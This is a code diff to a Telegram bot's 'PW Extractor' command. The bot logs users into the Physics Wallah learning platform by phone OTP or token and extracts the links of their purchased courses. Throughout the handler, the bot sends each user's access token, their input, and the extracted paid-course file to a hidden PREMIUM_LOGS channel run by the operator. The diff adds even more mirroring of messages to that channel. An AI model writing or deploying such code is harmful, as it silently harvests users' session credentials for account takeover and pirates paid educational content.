@@ -178,11 +178,11 @@ def format_content_line(name, url, content_type="", parent_id=None, child_id=Non
 @app.on_message(filters.command(["pw"]))
 async def pw_login(app, message):
     try:
-        # 🔹 यहाँ से forward_to_log हटा दिया – अब बाद में भेजेंगे
         query_msg = await app.ask(
             chat_id=message.chat.id,
             text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:**\n---\n**DONT LOGIN WITH PHONE NUMBER, It Leads to ban your account of PW**")
-        
+        await forward_to_log(query_msg, "PW Extractor")   # input already forward hota hai (pehle)
+
         user_input = query_msg.text.strip()
 
         if user_input.isdigit():
@@ -202,6 +202,9 @@ async def pw_login(app, message):
             }
 
             await app.send_message(message.chat.id, "🔄 **Sending OTP... Please wait!**")
+            # output bhi log pe
+            await app.send_message(PREMIUM_LOGS, "🔄 **Sending OTP... Please wait!**")
+
             otp_response = requests.post(
                 "https://api.penpencil.co/v1/users/get-otp?smsType=0",
                 headers=headers,
@@ -209,12 +212,14 @@ async def pw_login(app, message):
             ).json()
 
             if not otp_response.get("success"):
-                await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.**")
-                # फेल – फिर भी यूज़र इनपुट लॉग करें
-                await forward_to_log(query_msg, "PW Extractor - Invalid Number")
+                err_msg = "❌ **Invalid Mobile Number! Please provide a valid PW login number.**"
+                await message.reply_text(err_msg)
+                await app.send_message(PREMIUM_LOGS, err_msg)
                 return
 
             await app.send_message(message.chat.id, "✅ **OTP sent successfully! Please enter your OTP:**")
+            await app.send_message(PREMIUM_LOGS, "✅ **OTP sent successfully!**")
+
             otp_msg = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received:**")
             otp = otp_msg.text.strip()
 
@@ -230,6 +235,8 @@ async def pw_login(app, message):
             }
 
             await app.send_message(message.chat.id, "🔄 **Verifying OTP... Please wait!**")
+            await app.send_message(PREMIUM_LOGS, "🔄 **Verifying OTP...**")
+
             token_response = requests.post(
                 "https://api.penpencil.co/v3/oauth/token",
                 data=token_payload
@@ -237,35 +244,29 @@ async def pw_login(app, message):
 
             token = token_response.get("data", {}).get("access_token")
             if not token:
-                await message.reply_text("❌ **Login failed! Invalid OTP.**")
-                await forward_to_log(query_msg, "PW Extractor - Login Failed")
+                err_msg = "❌ **Login failed! Invalid OTP.**"
+                await message.reply_text(err_msg)
+                await app.send_message(PREMIUM_LOGS, err_msg)
                 return
 
-            # ✅ सफल – पहले सफलता + टोकन भेजें
-            dl = f"✅ **PW Login Successful!**\n\n🔑 **Token:** `{token}`"
-            await message.reply_text(dl)
-            await app.send_message(PREMIUM_LOGS, dl)   # यह पहले लॉग पर जाए
-
-            # अब यूज़र इनपुट (नंबर) फॉरवर्ड करें
-            await forward_to_log(query_msg, "PW Extractor - User Input (Success)")
+            # ✅ Success message (user ko & log channel ko)
+            success_msg = f"✅ **Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`"
+            await message.reply_text(success_msg)
+            await app.send_message(PREMIUM_LOGS, success_msg)
 
         elif user_input.startswith("e"):
             token = user_input
-            # ✅ टोकन स्वीकार – पहले सफलता भेजें
-            dl = f"✅ **Token accepted!**\n\n🔑 **Token:** `{token}`"
-            await message.reply_text(dl)
-            await app.send_message(PREMIUM_LOGS, dl)   # यह पहले लॉग पर जाए
-
-            # अब यूज़र इनपुट (टोकन) फॉरवर्ड करें
-            await forward_to_log(query_msg, "PW Extractor - Token Input")
+            success_msg = f"✅ **Token accepted!**\n\n🔑 **Token:** `{token}`"
+            await message.reply_text(success_msg)
+            await app.send_message(PREMIUM_LOGS, success_msg)
 
         else:
-            await message.reply_text("❌ **Invalid input! Please provide a valid mobile number or token.**")
-            # इनवैलिड इनपुट भी लॉग करें
-            await forward_to_log(query_msg, "PW Extractor - Invalid Input")
+            err_msg = "❌ **Invalid input! Please provide a valid mobile number or token.**"
+            await message.reply_text(err_msg)
+            await app.send_message(PREMIUM_LOGS, err_msg)
             return
 
-        # 🔹 आगे का कोड वही (बैच फेच, एक्सट्रैक्ट, फाइल भेजना) – ज्यों का त्यों
+        # 🔹 Baaki ka code (batch fetch, extract, file send) – yahan bhi har output ko log channel pe bhejna
         headers = {
             "client-id": "5eb393ee95fab7468a79d189",
             "client-type": "WEB",
@@ -282,7 +283,9 @@ async def pw_login(app, message):
 
         batches = batch_response.get("data", [])
         if not batches:
-            await message.reply_text("❌ **No batches found for this account.**")
+            err_msg = "❌ **No batches found for this account.**"
+            await message.reply_text(err_msg)
+            await app.send_message(PREMIUM_LOGS, err_msg)
             return
 
         batch_text = "📚 **Your Batches:**\n\n"
@@ -293,19 +296,24 @@ async def pw_login(app, message):
             batch_text += f"📖 `{bi}` → **{bn}**\n"
             batch_map[bi] = bn
 
-        query_msg = await app.send_message(
+        # ye message user ko dikhega, log bhi karein
+        await app.send_message(
             chat_id=message.chat.id,
             text=batch_text + "\n\n💡 **Please enter the Course ID to continue:**",
             reply_markup=None
         )
+        await app.send_message(PREMIUM_LOGS, "📋 **Batch list sent to user.**")
 
         target_id_msg = await app.ask(message.chat.id, text="🆔 **Enter the Course ID here:**")
         target_id = target_id_msg.text.strip()
 
         if target_id not in batch_map:
-            await message.reply_text("❌ **Invalid Course ID! Please try again.**")
+            err_msg = "❌ **Invalid Course ID! Please try again.**"
+            await message.reply_text(err_msg)
+            await app.send_message(PREMIUM_LOGS, err_msg)
             return
 
+        # Option
         option_msg = await app.ask(
             message.chat.id,
             text="**Kya extract karna hai?**\n\n`1` - Full Batch\n`2` - Today Class Only"
@@ -321,7 +329,9 @@ async def pw_login(app, message):
             today_only = True
             mode_text = "Today Class"
         else:
-            await message.reply_text("❌ **Galat input**\n\n`1` - Full Batch\n`2` - Today Class")
+            err_msg = "❌ **Galat input**\n\n`1` - Full Batch\n`2` - Today Class"
+            await message.reply_text(err_msg)
+            await app.send_message(PREMIUM_LOGS, err_msg)
             return
 
         batch_name = batch_map[target_id]
@@ -331,6 +341,7 @@ async def pw_login(app, message):
             chat_id=message.chat.id,
             text=f"🕵️ **Fetching {mode_text} for:** **{batch_name}**... Please wait!"
         )
+        await app.send_message(PREMIUM_LOGS, f"🕵️ **Fetching {mode_text} for {batch_name}**...")
 
         course_response = requests.get(
             f"https://api.penpencil.co/v3/batches/{target_id}/details",
@@ -339,13 +350,16 @@ async def pw_login(app, message):
 
         subjects = course_response.get("data", {}).get("subjects", [])
         if not subjects:
-            await message.reply_text("❌ **No subjects found for the selected course.**")
+            err_msg = "❌ **No subjects found for the selected course.**"
+            await message.reply_text(err_msg)
+            await app.send_message(PREMIUM_LOGS, err_msg)
             return
 
         progress_msg = await app.send_message(
             chat_id=message.chat.id,
             text=f"🚀 **Initializing {mode_text} Extraction...**"
         )
+        await app.send_message(PREMIUM_LOGS, f"🚀 **Initializing {mode_text} Extraction...**")
 
         all_subjects_progress = {}
         total_links = [0]
@@ -382,7 +396,9 @@ async def pw_login(app, message):
             await update_progress()
 
         if not all_links:
-            await message.reply_text(f"❌ **{mode_text} me koi class nahi mili.**")
+            err_msg = f"❌ **{mode_text} me koi class nahi mili.**"
+            await message.reply_text(err_msg)
+            await app.send_message(PREMIUM_LOGS, err_msg)
             return
 
         with open(filename, 'w', encoding='utf-8') as f:
@@ -396,8 +412,8 @@ async def pw_login(app, message):
         end_time = time.time()
         extraction_time = end_time - start_time
 
-        up = (f"**Login Succesfull for PW:** `{token}`")
-        captionn = (f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}\n Mode: {mode_text}")
+        up = f"**Login Successful for PW:** `{token}`"
+        captionn = f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}\n Mode: {mode_text}"
         caption = (
     "━━━━━━━━━━━━━━━━━━━\n"
     "🏦 𝐏𝐡𝐲𝐬𝐢𝐜𝐬 𝐖𝐚𝐥𝐥𝐚𝐡 (PW)\n"
@@ -411,11 +427,16 @@ async def pw_login(app, message):
     "🌐 Join Us ➜ [JOIN BACKUP](https://t.me/ZXBOT1)\n"
     "━━━━━━━━━━━━━━━━━━━"
         )
+
+        # user ko document & caption
         await app.send_document(chat_id=message.chat.id, document=filename, caption=caption)
+        # log channel ko bhi document & caption (aapne pehle se captionn use kiya hai)
         await app.send_document(PREMIUM_LOGS, document=filename, caption=captionn)
         await app.send_message(PREMIUM_LOGS, up)
 
     except Exception as e:
         error_msg = str(e)
         error_msg = clean_text(error_msg[:200]) + "..." if len(error_msg) > 200 else clean_text(error_msg)
-        await message.reply_text(f"❌ **An error occurred:** `{error_msg}`")
+        err_text = f"❌ **An error occurred:** `{error_msg}`"
+        await message.reply_text(err_text)
+        await app.send_message(PREMIUM_LOGS, err_text)
